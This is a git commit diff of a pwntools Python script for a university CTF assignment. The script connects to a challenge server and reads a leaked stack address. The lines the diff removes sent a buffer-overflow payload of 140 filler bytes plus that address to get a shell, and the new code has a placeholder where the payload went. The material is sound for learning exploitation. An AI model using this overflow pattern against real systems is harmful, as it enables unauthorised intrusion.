261dd907a1bb217829115ae1d5c1fb024578d18b
Malachi Parks <Malachiparks1999@gmail.com>
2022-02-23 19:32:49 -0500

    Script answer base for PCP8

--- PCPs/Pacecar8/answer.py
+++ PCPs/Pacecar8/answer.py
@@ -7,14 +7,26 @@ File Description:  Used to print to the nc session
 nc 165.22.46.243 7331
 '''
 
+'''
+Creators:       Malachi Parks
+Section:        CPEG476-010
+Assignment:     Pacecar Problem 9
+File Description:  Used to print to the nc session
+
+165.22.46.243", 13337
+
+Run in interactive python to key flag
+'''
+
 from pwn import *
-p=remote("165.22.46.243", 7331) # Used to open nc connection
-resp=p.recvuntil(b"help ")
-leak=p.recvuntil(b"\n")
+p=remote("165.22.46.243", 7331)
+print("""scouting tells us expected output looks like:\n
+  This isn't vulnerable\n
+  This might help 0xffbeea50\n""")
+resp=p.recvuntil("help ")
+leak=p.recvuntil("\n")
 #leak looks like "0xffbeea50\n"
 intleak = int(leak,16)
-print("This isn't vulerable")
-print(b'This might help: ' + p32(intleak, endian="big"))
-p.sendline(b'a'*140+p32(intleak))#for nice unprintable payloads
+p.sendline("payloadhere")#for nice unprintable payloads
 p.interactive()
 #if you have a shell then you can now type `ls` and `cat flag`
